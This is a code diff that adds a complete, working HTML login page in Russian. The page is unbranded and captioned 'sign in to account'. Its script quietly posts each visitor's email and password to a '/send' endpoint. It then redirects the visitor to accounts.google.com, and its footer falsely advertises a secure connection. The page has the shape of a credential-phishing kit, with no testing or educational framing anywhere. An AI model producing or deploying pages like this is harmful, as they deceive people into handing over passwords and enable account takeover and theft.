@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Вход в аккаунт</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:system-ui,Segoe UI,Roboto,sans-serif}
+body{background:#f0f2f5;display:flex;align-items:center;justify-content:center;height:100vh}
+.card{background:#fff;padding:40px 32px;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.08);width:360px}
+h1{font-size:22px;margin-bottom:8px;color:#1a1a1a}
+p.sub{font-size:13px;color:#666;margin-bottom:24px}
+input{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:8px;font-size:15px;margin-bottom:14px}
+input:focus{outline:none;border-color:#4a6cf7}
+button{width:100%;padding:12px;background:#4a6cf7;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
+button:hover{background:#3b5ae0}
+.foot{margin-top:18px;text-align:center;font-size:12px;color:#999}
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>Вход в аккаунт</h1>
+  <p class="sub">Введите данные для продолжения</p>
+  <form id="f">
+    <input type="email" id="email" placeholder="Электронная почта" required autofocus>
+    <input type="password" id="password" placeholder="Пароль" required>
+    <button type="submit">Войти</button>
+  </form>
+  <div class="foot">Защищённое соединение</div>
+</div>
+<script>
+document.getElementById("f").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value;
+  try {
+    await fetch("/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password })
+    });
+  } catch (_) {}
+  window.location.href = "https://accounts.google.com/";
+});
+</script>
+</body>
+</html>
